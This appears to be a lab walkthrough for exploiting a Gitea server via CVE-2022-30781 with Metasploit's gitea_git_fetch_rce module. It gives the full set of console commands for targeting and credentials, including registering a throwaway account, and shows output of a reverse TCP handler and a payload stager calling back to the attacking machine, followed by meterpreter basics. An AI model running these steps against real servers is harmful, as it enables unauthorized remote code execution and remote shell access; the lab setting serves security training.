## 1. Searching Metasploit
Start up your *msfconsole* and search for the Gitea exploit.
`search gitea`
![](./metasploit01.png)
You will recall that your target Gitea server is potentially vulnerable to *CVE-2022-30781* and that the remediation commit in Github 
references escaping the git fetch remote URL.  In this case we're interested in option *#0*.  Load up this exploit module with either:

`use 0`

`use exploit/multi/http/gitea_git_fetch_rce`

## 2. Attempting the exploit
Typing *show options* tells us we need to set a couple of options

* **RHOSTS** - Our target IP address
* **LHOST**  - The IP of our attacking machine
* **USERNAME** - Presumably Gitea credentials
* **PASSWORD** - Presumably Gitea credentials

Setting values within *msfconsole* is really straight forward.

 * `set RHOSTS 192.168.0.105`
 * `set LHOST 192.168.0.103`
 * `set USERNAME guest`
 * `set PASSWORD guest`
 * `set SRVPORT 8181` - The port on our machine we'll tell Gitea to connect to
 * `set ForceExploit true` - Ignores whatever the *check* module returns
 * `run` - Try the exploit

```bash
[*] Started reverse TCP handler on 192.168.0.103:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Cannot reliably check exploitability. Check TARGETURI - Unexpected HTTP response code ForceExploit is enabled, proceeding with exploitation.
[*] Using URL: http://192.168.0.103:8181/
[*] Using URL: http://192.168.0.103:8181/3oYWb2XU9
[*] Command Stager progress - 100.00% done (115/115 bytes)
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/gitea_git_fetch_rce) > 
```

## 3. Creating a user
It looks like our exploit will require valid credentials to Gitea.  Check if the server allows account creation.
![](./gitea01.png)

It looks like we can create a new user account!
![](./gitea02.png)

Now head back to your *msfconsole* and set the *USERNAME* and *PASSWORD* for the user account you just created and try the exploit again.

```bash
[*] Started reverse TCP handler on 192.168.0.103:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: 1.16.6
[*] Using URL: http://192.168.0.103:8181/
[*] Using URL: http://192.168.0.103:8181/bnQOtbfkgbqrJGD

## 4. Meterpreter basics

You can return to your *msfconsole* at any time simply by issuing the **background** command. 
While in the *msfconsole* you can type **sessions** to get a list of active meterpreter sessions and then `sessions -i 0`
 where 0 is the Id of the session you want to interact with that session.

* Type `help` to get a list of available meterpreter commands

There is quite a bit you can do with a meterpreter session and there is no need for me to rewrite the great documentation 
that already exists.  So here are a few external links for you to check out on your own.
